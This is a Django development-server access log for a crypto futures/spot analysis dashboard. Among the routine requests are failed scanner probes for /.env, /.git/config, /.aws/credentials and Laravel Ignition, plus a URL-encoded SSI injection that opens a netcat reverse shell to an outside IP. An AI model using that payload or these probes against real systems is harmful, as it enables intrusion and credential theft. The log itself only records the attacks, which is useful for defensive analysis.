Watching for file changes with StatReloader
[15/May/2022 14:27:28] "GET / HTTP/1.0" 302 0
[15/May/2022 14:27:28] "GET /public/index.html HTTP/1.0" 200 2139
[15/May/2022 14:27:29] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[15/May/2022 14:27:29] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[15/May/2022 14:27:29] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[15/May/2022 14:27:29] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969945
[15/May/2022 14:27:29] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[15/May/2022 14:27:30] "GET /api/authentication/getUser HTTP/1.0" 200 84
[15/May/2022 14:27:30] "GET /public/favicon.ico HTTP/1.0" 304 0
Not Found: /sockjs-node
[15/May/2022 14:27:30] "GET /sockjs-node HTTP/1.0" 404 2189
[15/May/2022 14:27:30] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.0" 200 20322
[15/May/2022 14:27:31] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 200 18199
[15/May/2022 14:27:31] "POST /api/future_spot_summary/read HTTP/1.0" 200 32939
[15/May/2022 14:27:31] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[15/May/2022 14:27:31] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[15/May/2022 14:27:31] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[15/May/2022 14:27:31] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 200 66644
[15/May/2022 14:27:31] "POST /api/future_candle_1m/read HTTP/1.0" 200 690048
[15/May/2022 14:27:31] "POST /api/spot_candle_1m/read HTTP/1.0" 200 658749
[15/May/2022 14:27:32] "POST /api/future_spot_diff/read HTTP/1.0" 200 708294
[15/May/2022 14:28:33] "POST /api/future_spot_summary/read HTTP/1.0" 200 32939
[15/May/2022 14:29:44] "POST /api/future_spot_summary/read HTTP/1.0" 200 32939
[15/May/2022 14:29:44] "POST /api/future_candle_1m/read HTTP/1.0" 200 690048
[15/May/2022 14:29:45] "POST /api/spot_candle_1m/read HTTP/1.0" 200 658749
[15/May/2022 14:29:45] "POST /api/future_spot_diff/read HTTP/1.0" 200 708294
[15/May/2022 14:35:07] "POST /api/future_candle_1m/read HTTP/1.0" 200 698871
[15/May/2022 14:35:10] "POST /api/spot_candle_1m/read HTTP/1.0" 200 50
[15/May/2022 14:35:10] "POST /api/future_spot_diff/read HTTP/1.0" 200 737635
/opt/nora_analysis/Client/Controller/future_candle_1m.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:27:20
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/opt/nora_analysis/Client/Controller/future_spot_diff.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:47:35
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/opt/nora_analysis/Client/Controller/spot_candle_1m.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:47:45
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
[15/May/2022 14:48:03] "GET /public/index.html HTTP/1.0" 200 2139
[15/May/2022 14:48:03] "GET /public/static/js/bundle.js HTTP/1.0" 200 38798
[15/May/2022 14:48:03] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.0" 200 197075
[15/May/2022 14:48:03] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.0" 200 96134
[15/May/2022 14:48:03] "GET /public/static/js/main.chunk.js HTTP/1.0" 200 1969843
[15/May/2022 14:48:03] "GET /public/static/js/0.chunk.js HTTP/1.0" 200 7823647
[15/May/2022 14:48:04] "GET /api/authentication/getUser HTTP/1.0" 200 84
Not Found: /sockjs-node
[15/May/2022 14:48:04] "GET /sockjs-node HTTP/1.0" 404 2189
[15/May/2022 14:48:04] "GET /public/favicon.ico HTTP/1.0" 200 22382
[15/May/2022 14:48:05] "GET /public/assets/layout/images/logo-light.png HTTP/1.0" 200 2725
[15/May/2022 14:48:05] "GET /public/assets/layout/images/appname-light.png HTTP/1.0" 200 3473
[15/May/2022 14:48:05] "GET /public/assets/layout/images/profile-image.png HTTP/1.0" 200 18199
[15/May/2022 14:48:05] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.0" 200 18199
[15/May/2022 14:48:05] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.0" 200 66644
[15/May/2022 14:48:05] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.0" 200 20322
[15/May/2022 14:48:05] "POST /api/future_spot_summary/read HTTP/1.0" 200 32925
[15/May/2022 14:48:11] "POST /api/future_candle_1m/read HTTP/1.0" 200 36604825
/opt/nora_analysis/Client/Controller/future_candle_1m.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:47:59
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/opt/nora_analysis/Client/Controller/future_spot_diff.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:50:00
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
/opt/nora_analysis/Client/Controller/spot_candle_1m.py changed, reloading.
Performing system checks...

System check identified no issues (0 silenced).
May 15, 2022 - 14:50:08
Django version 2.2.12, using settings 'nora_analysis.settings'
Starting development server at http://0.0.0.0:8002/
Quit the server with CONTROL-C.
Watching for file changes with StatReloader
[15/May/2022 14:50:18] "GET /public/index.html HTTP/1.0" 304 0
[15/May/2022 14:50:19] "GET /api/authentication/getUser HTTP/1.0" 200 84
Not Found: /sockjs-node
[15/May/2022 14:50:19] "GET /sockjs-node HTTP/1.0" 404 2189
[15/May/2022 14:50:19] "POST /api/future_spot_summary/read HTTP/1.0" 200 32925
[15/May/2022 14:50:19] "POST /api/future_candle_1m/read HTTP/1.0" 200 690048
[15/May/2022 14:50:20] "POST /api/spot_candle_1m/read HTTP/1.0" 200 658749
[15/May/2022 14:50:20] "POST /api/future_spot_diff/read HTTP/1.0" 200 708294
Not Found: /.env
[15/May/2022 14:58:26] "GET /.env HTTP/1.0" 404 2160
Not Found: /incl/image_test.shtml
[15/May/2022 14:59:53] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 2369
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:48] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:49] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:50] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:51] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:52] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 15:01:53] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[15/May/2022 15:53:41] "GET / HTTP/1.0" 302 0
[15/May/2022 16:21:34] "GET /public/favicon.ico HTTP/1.0" 200 22382
[15/May/2022 16:24:03] "GET / HTTP/1.0" 302 0
Not Found: /.git/config
[15/May/2022 16:40:50] "GET /.git/config HTTP/1.0" 404 2181
[15/May/2022 16:52:29] "GET / HTTP/1.0" 302 0
[15/May/2022 16:52:30] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /incl/image_test.shtml
[15/May/2022 17:06:00] "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20193.124.7.9%2031337%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0" 404 2369
[15/May/2022 17:12:44] "HEAD / HTTP/1.0" 302 0
[15/May/2022 17:12:50] "GET / HTTP/1.0" 302 0
[15/May/2022 17:22:28] "GET / HTTP/1.0" 302 0
[15/May/2022 17:23:37] "GET / HTTP/1.0" 302 0
[15/May/2022 17:37:00] "GET / HTTP/1.0" 302 0
[15/May/2022 17:37:00] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /.aws/credentials
[15/May/2022 17:44:43] "GET /.aws/credentials HTTP/1.0" 404 2196
[15/May/2022 17:54:01] "GET / HTTP/1.0" 302 0
[15/May/2022 17:54:01] "GET /public/index.html HTTP/1.0" 200 2139
[15/May/2022 18:12:50] "GET / HTTP/1.0" 302 0
[15/May/2022 18:17:29] "GET / HTTP/1.0" 302 0
[15/May/2022 18:36:10] "GET / HTTP/1.1" 302 0
[15/May/2022 18:36:10] "GET /public/index.html HTTP/1.1" 200 2139
[15/May/2022 18:36:10] "GET /public/static/js/bundle.js HTTP/1.1" 200 38798
[15/May/2022 18:36:10] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.1" 200 197075
[15/May/2022 18:36:11] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.1" 200 96134
[15/May/2022 18:36:12] "GET /public/static/js/main.chunk.js HTTP/1.1" 200 1969843
[15/May/2022 18:36:14] "GET /public/static/js/0.chunk.js HTTP/1.1" 200 7823647
[15/May/2022 18:36:24] "GET /public/testplotly.html HTTP/1.1" 200 3690708
[15/May/2022 18:39:08] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3712900
[15/May/2022 18:41:39] "GET /public/favicon.ico HTTP/1.0" 304 0
Not Found: /.env
[15/May/2022 18:48:02] "GET /.env HTTP/1.0" 404 2160
[15/May/2022 19:01:32] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3713023
[15/May/2022 19:04:28] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3713026
[15/May/2022 19:10:27] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3758762
[15/May/2022 19:12:42] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759066
[15/May/2022 19:20:13] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759122
[15/May/2022 19:22:02] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759138
[15/May/2022 19:28:42] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759175
[15/May/2022 19:29:40] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759173
[15/May/2022 19:35:05] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759173
[15/May/2022 19:35:32] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759236
[15/May/2022 19:47:39] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759195
[15/May/2022 19:50:02] "GET / HTTP/1.0" 302 0
[15/May/2022 19:53:20] "GET / HTTP/1.0" 302 0
[15/May/2022 19:53:21] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759233
[15/May/2022 19:53:22] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /favicon.ico
[15/May/2022 19:53:22] "GET /favicon.ico HTTP/1.0" 404 2178
Not Found: /robots.txt
[15/May/2022 19:53:22] "GET /robots.txt HTTP/1.0" 404 2175
[15/May/2022 19:53:48] "GET /public/testplotly.html HTTP/1.1" 404 1673
[15/May/2022 20:16:39] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 304 0
[15/May/2022 20:25:35] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 3759233
[15/May/2022 20:29:35] "GET / HTTP/1.0" 302 0
[15/May/2022 20:32:49] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 98399716
[15/May/2022 20:33:15] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 98399716
[15/May/2022 20:35:18] "GET / HTTP/1.1" 302 0
[15/May/2022 20:35:18] "GET /public/index.html HTTP/1.1" 304 0
[15/May/2022 20:35:18] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.1" 304 0
[15/May/2022 20:35:18] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.1" 304 0
[15/May/2022 20:35:18] "GET /public/static/js/0.chunk.js HTTP/1.1" 304 0
[15/May/2022 20:35:18] "GET /public/static/js/bundle.js HTTP/1.1" 304 0
[15/May/2022 20:35:18] "GET /public/static/js/main.chunk.js HTTP/1.1" 304 0
Not Found: /sockjs-node
[15/May/2022 20:35:19] "GET /sockjs-node HTTP/1.1" 404 2187
[15/May/2022 20:35:19] "GET /api/authentication/getUser HTTP/1.1" 200 84
[15/May/2022 20:35:19] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.1" 200 20322
[15/May/2022 20:35:19] "GET /public/assets/layout/images/logo-light.png HTTP/1.1" 200 2725
[15/May/2022 20:35:19] "GET /public/assets/layout/images/profile-image.png HTTP/1.1" 200 18199
[15/May/2022 20:35:19] "GET /public/assets/layout/images/appname-light.png HTTP/1.1" 200 3473
[15/May/2022 20:35:19] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.1" 200 66644
[15/May/2022 20:35:19] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.1" 200 18199
[15/May/2022 20:35:19] "POST /api/future_spot_summary/read HTTP/1.1" 200 32925
[15/May/2022 20:35:20] "POST /api/future_candle_1m/read HTTP/1.1" 200 690048
[15/May/2022 20:35:21] "POST /api/spot_candle_1m/read HTTP/1.1" 200 658749
[15/May/2022 20:35:22] "POST /api/future_spot_diff/read HTTP/1.1" 200 708294
[15/May/2022 20:41:58] "HEAD / HTTP/1.0" 302 0
Not Found: /echo.php
[15/May/2022 21:03:20] "GET /echo.php HTTP/1.0" 404 2173
[15/May/2022 21:07:54] "GET / HTTP/1.0" 302 0
[15/May/2022 21:31:57] "GET / HTTP/1.0" 302 0
[15/May/2022 21:44:06] "GET / HTTP/1.0" 302 0
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:42] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:43] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:44] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:45] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:46] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[15/May/2022 21:58:47] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[15/May/2022 22:07:28] "HEAD / HTTP/1.0" 302 0
[15/May/2022 22:13:05] "GET / HTTP/1.0" 302 0
[15/May/2022 22:17:40] "GET / HTTP/1.0" 302 0
[15/May/2022 22:17:40] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /favicon.ico
[15/May/2022 22:17:41] "GET /favicon.ico HTTP/1.0" 404 2178
Not Found: /robots.txt
[15/May/2022 22:17:41] "GET /robots.txt HTTP/1.0" 404 2175
Not Found: /TP/public/index.php
[15/May/2022 22:41:47] "GET /TP/public/index.php HTTP/1.0" 404 2205
Not Found: /TP/index.php
[15/May/2022 22:41:47] "GET /TP/index.php HTTP/1.0" 404 2184
Not Found: /thinkphp/html/public/index.php
[15/May/2022 22:41:48] "GET /thinkphp/html/public/index.php HTTP/1.0" 404 2238
Not Found: /html/public/index.php
[15/May/2022 22:41:49] "GET /html/public/index.php HTTP/1.0" 404 2211
[15/May/2022 22:41:50] "GET /public/index.php HTTP/1.0" 404 1649
Not Found: /TP/html/public/index.php
[15/May/2022 22:41:50] "GET /TP/html/public/index.php HTTP/1.0" 404 2220
Not Found: /elrekt.php
[15/May/2022 22:41:51] "GET /elrekt.php HTTP/1.0" 404 2178
Not Found: /index.php
[15/May/2022 22:41:52] "GET /index.php HTTP/1.0" 404 2175
[15/May/2022 22:41:52] "GET / HTTP/1.0" 302 0
[15/May/2022 22:41:53] "GET /public/index.html HTTP/1.0" 200 2139
[15/May/2022 22:54:21] "GET / HTTP/1.0" 302 0
[16/May/2022 00:35:42] "HEAD / HTTP/1.0" 302 0
[16/May/2022 01:08:21] "GET / HTTP/1.0" 302 0
[16/May/2022 01:08:21] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 01:36:24] "GET / HTTP/1.0" 302 0
[16/May/2022 01:42:01] "GET /public/favicon.ico HTTP/1.0" 304 0
[16/May/2022 02:12:25] "GET / HTTP/1.0" 302 0
[16/May/2022 02:12:25] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 02:26:21] "GET / HTTP/1.0" 302 0
[16/May/2022 02:26:22] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 02:38:17] "GET / HTTP/1.1" 302 0
[16/May/2022 02:38:17] "GET /public/index.html HTTP/1.1" 304 0
[16/May/2022 02:38:17] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.1" 304 0
[16/May/2022 02:38:17] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.1" 304 0
[16/May/2022 02:38:17] "GET /public/static/js/bundle.js HTTP/1.1" 304 0
[16/May/2022 02:38:17] "GET /public/static/js/main.chunk.js HTTP/1.1" 304 0
[16/May/2022 02:38:17] "GET /public/static/js/0.chunk.js HTTP/1.1" 304 0
Not Found: /sockjs-node
[16/May/2022 02:38:17] "GET /sockjs-node HTTP/1.1" 404 2187
[16/May/2022 02:38:17] "GET /api/authentication/getUser HTTP/1.1" 200 84
[16/May/2022 02:38:17] "GET /public/assets/layout/images/effect-ondark.png HTTP/1.1" 304 0
[16/May/2022 02:38:18] "GET /public/assets/layout/images/profile-image.png HTTP/1.1" 304 0
[16/May/2022 02:38:18] "GET /public/assets/layout/images/logo-light.png HTTP/1.1" 304 0
[16/May/2022 02:38:18] "GET /public/assets/layout/images/appname-light.png HTTP/1.1" 304 0
[16/May/2022 02:38:18] "POST /api/future_spot_summary/read HTTP/1.1" 200 32925
[16/May/2022 02:38:18] "GET /public/static/media/primeicons.91bacab1.ttf HTTP/1.1" 304 0
[16/May/2022 02:38:18] "GET /public/assets/layout/images/dashboard/gene.png HTTP/1.1" 304 0
[16/May/2022 02:38:18] "POST /api/future_candle_1m/read HTTP/1.1" 200 690048
[16/May/2022 02:38:18] "POST /api/spot_candle_1m/read HTTP/1.1" 200 658749
[16/May/2022 02:38:18] "POST /api/future_spot_diff/read HTTP/1.1" 200 708294
[16/May/2022 02:38:53] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 98399716
[16/May/2022 02:50:10] "GET /public/DiffPlot/BTCUSDT.html HTTP/1.1" 200 98399739
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:14] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:15] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:16] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:17] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:18] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:19] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:20] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:21] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 03:13:22] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
[16/May/2022 03:55:44] "GET / HTTP/1.0" 302 0
Not Found: /text4041652673471
[16/May/2022 03:57:51] "GET /text4041652673471 HTTP/1.0" 404 2199
[16/May/2022 03:57:51] "GET / HTTP/1.0" 302 0
Not Found: /sdk
[16/May/2022 03:57:51] "POST /sdk HTTP/1.0" 404 2158
Not Found: /HNAP1
[16/May/2022 03:57:51] "GET /HNAP1 HTTP/1.0" 404 2163
[16/May/2022 03:57:51] "GET / HTTP/1.0" 302 0
Not Found: /evox/about
[16/May/2022 03:57:51] "GET /evox/about HTTP/1.0" 404 2178
[16/May/2022 03:58:06] "GET / HTTP/1.0" 302 0
[16/May/2022 03:58:06] "GET /public/index.html HTTP/1.0" 200 2139
[16/May/2022 03:58:07] "GET /public/favicon.ico HTTP/1.0" 200 22382
Not Found: /robots.txt
[16/May/2022 03:58:07] "GET /robots.txt HTTP/1.0" 404 2178
[16/May/2022 04:13:41] "GET /public/favicon.ico HTTP/1.0" 304 0
[16/May/2022 04:36:55] "GET / HTTP/1.0" 302 0
Not Found: /.git/config
[16/May/2022 04:54:13] "GET /.git/config HTTP/1.0" 404 2181
[16/May/2022 05:51:55] "GET / HTTP/1.0" 302 0
Not Found: /boaform/admin/formLogin
[16/May/2022 05:54:12] "POST /boaform/admin/formLogin HTTP/1.0" 404 2218
[16/May/2022 06:05:26] "GET / HTTP/1.0" 302 0
Not Found: /manager/text/list
[16/May/2022 06:54:52] "GET /manager/text/list HTTP/1.0" 404 2199
Not Found: /phpMyAdmin/scripts/setup.php
[16/May/2022 07:00:19] "GET /phpMyAdmin/scripts/setup.php HTTP/1.0" 404 2232
Not Found: /MyAdmin/scripts/setup.php
[16/May/2022 07:00:30] "GET /MyAdmin/scripts/setup.php HTTP/1.0" 404 2223
[16/May/2022 07:02:06] "GET / HTTP/1.0" 302 0
[16/May/2022 07:02:06] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /manager/html
[16/May/2022 07:18:57] "GET /manager/html HTTP/1.0" 404 2184
[16/May/2022 08:16:06] "GET / HTTP/1.0" 302 0
[16/May/2022 08:32:16] "GET / HTTP/1.0" 302 0
[16/May/2022 08:32:16] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /wsman
[16/May/2022 08:46:27] "POST /wsman HTTP/1.0" 404 2164
[16/May/2022 09:02:47] "HEAD / HTTP/1.0" 302 0
[16/May/2022 09:22:07] "GET / HTTP/1.0" 302 0
[16/May/2022 09:22:07] "GET /public/index.html HTTP/1.0" 200 2139
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:28] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:29] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:30] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:31] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:32] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:33] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:34] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:35] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:36] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:37] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:38] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:39] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:40] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /_ignition/execute-solution
[16/May/2022 09:30:41] "POST /_ignition/execute-solution HTTP/1.0" 404 2227
Not Found: /.env
[16/May/2022 09:41:55] "GET /.env HTTP/1.0" 404 2160
Not Found: /portal/redlion
[16/May/2022 09:48:01] "GET /portal/redlion HTTP/1.0" 404 2190
Not Found: /admin/config.php
[16/May/2022 09:52:25] "GET /admin/config.php HTTP/1.0" 404 3928
Not Found: /actuator/health
[16/May/2022 09:57:33] "GET /actuator/health HTTP/1.0" 404 2193
[16/May/2022 10:19:30] "GET / HTTP/1.1" 302 0
[16/May/2022 10:19:30] "GET /public/index.html HTTP/1.1" 304 0
[16/May/2022 10:19:30] "GET /public/assets/theme/blue/theme-dark.css HTTP/1.1" 304 0
[16/May/2022 10:19:30] "GET /public/assets/layout/css/blue/layout-dark.css HTTP/1.1" 304 0
